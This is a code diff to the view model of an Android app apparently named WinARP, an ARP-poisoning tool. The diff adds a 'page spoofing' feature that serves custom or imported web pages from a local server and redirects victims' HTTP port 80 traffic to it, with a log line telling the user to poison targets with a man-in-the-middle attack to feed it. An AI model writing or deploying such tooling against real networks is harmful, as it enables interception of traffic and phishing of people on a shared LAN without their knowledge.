@@ -8,6 +8,8 @@ import com.winarp.mobile.data.CapturePeer
 import com.winarp.mobile.data.HostInfo
 import com.winarp.mobile.data.IfaceInfo
 import com.winarp.mobile.data.RootState
+import com.winarp.mobile.data.SpoofConfig
+import com.winarp.mobile.data.SpoofMode
 import com.winarp.mobile.net.ArpPoisoner
 import com.winarp.mobile.net.CaptureEngine
 import com.winarp.mobile.net.IpUtils
@@ -16,6 +18,8 @@ import com.winarp.mobile.net.NativeArp
 import com.winarp.mobile.net.NetworkRepository
 import com.winarp.mobile.net.RootHelper
 import com.winarp.mobile.net.RootNet
+import com.winarp.mobile.net.WebServer
+import java.io.File
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
@@ -43,6 +47,8 @@ data class MainUiState(
     val screen: AppScreen = AppScreen.Main,
     val showRaw: Boolean = false,
     val forcePlaintext: Boolean = false,
+    val spoofConfig: SpoofConfig = SpoofConfig(),
+    val spoofHtml: String = WebServer.DEFAULT_PAGE,
     val scanning: Boolean = false,
     val attacking: Boolean = false,
     val scanProgress: Pair<Int, Int>? = null,
@@ -70,6 +76,13 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
     val captureRaw: StateFlow<List<String>> = capture.raw
     val captureRunning: StateFlow<Boolean> = capture.running
     val captureTarget: StateFlow<String?> = capture.target
+
+    private val web = WebServer()
+    val webRunning: StateFlow<Boolean> = web.running
+    val webRequests: StateFlow<Int> = web.requests
+    val webLog: StateFlow<List<String>> = web.log
+    private val spoofDir = File(getApplication<Application>().filesDir, "spoofsite")
+    private val singleFile = File(getApplication<Application>().filesDir, "spoof_single.html")
 
     init {
         appendLog("WinARP Android - LAN scan / multi-thread ARP poison")
@@ -394,6 +407,67 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
         capture.setRawEnabled(on)
     }
 
+    // ---- Page spoofing (configurable web server + :80 REDIRECT) ----
+
+    fun openSpoof() = _state.update { it.copy(screen = AppScreen.Spoof) }
+
+    fun closeSpoof() {
+        if (web.running.value) stopSpoof()
+        _state.update { it.copy(screen = AppScreen.Main) }
+    }
+
+    fun updateSpoofMode(m: SpoofMode) = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(mode = m)) }
+    fun updateRedirectUrl(v: String) = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(redirectUrl = v.trim())) }
+    fun updateTargetHosts(v: String) = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(targetHosts = v)) }
+    fun updateSpoofHtml(v: String) = _state.update { it.copy(spoofHtml = v) }
+    fun toggleCaptive() = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(assistCaptivePortal = !it.spoofConfig.assistCaptivePortal)) }
+    fun toggleSpa() = _state.update { it.copy(spoofConfig = it.spoofConfig.copy(spaFallback = !it.spoofConfig.spaFallback)) }
+
+    /** Absolute path of the document root, so users can push an imported site / Vite dist into it. */
+    fun spoofDocRootPath(): String = spoofDir.absolutePath
+
+    fun toggleSpoof() {
+        if (web.running.value) stopSpoof() else startSpoof()
+    }
+
+    private fun startSpoof() {
+        val iface = _state.value.selectedIface
+        if (iface == null) {
+            appendLog("[-] no NIC selected")
+            return
+        }
+        val st = _state.value
+        try {
+            singleFile.writeText(st.spoofHtml.ifBlank { WebServer.DEFAULT_PAGE })
+            if (!spoofDir.exists()) spoofDir.mkdirs()
+            val idx = File(spoofDir, "index.html")
+            if (!idx.exists()) idx.writeText(WebServer.DEFAULT_PAGE)
+        } catch (t: Throwable) {
+            appendLog("[!] spoof storage: ${t.message}")
+        }
+        val err = web.start(st.spoofConfig, spoofDir, singleFile)
+        if (err != null) {
+            appendLog("[!] spoof server: $err")
+            return
+        }
+        viewModelScope.launch {
+            val re = RootNet.enableHttpRedirect(iface.name, st.spoofConfig.port)
+            if (re == null) {
+                appendLog("[+] spoof ON — HTTP :80 -> :${st.spoofConfig.port} (poison targets with MITM to feed it)")
+            } else {
+                appendLog("[!] http redirect: $re")
+            }
+        }
+    }
+
+    private fun stopSpoof() {
+        web.stop()
+        val iface = _state.value.selectedIface
+        val port = _state.value.spoofConfig.port
+        if (iface != null) viewModelScope.launch { RootNet.disableHttpRedirect(iface.name, port) }
+        appendLog("[*] spoof stopped")
+    }
+
     /** Pick a single host to filter the sniff/attack: explicit From, else target spec, else a selected host. */
     private fun firstTargetIp(): String? {
         val st = _state.value
@@ -407,6 +481,7 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
     override fun onCleared() {
         super.onCleared()
         capture.stop()
+        web.stop()
     }
 
     private fun appendLog(line: String) {
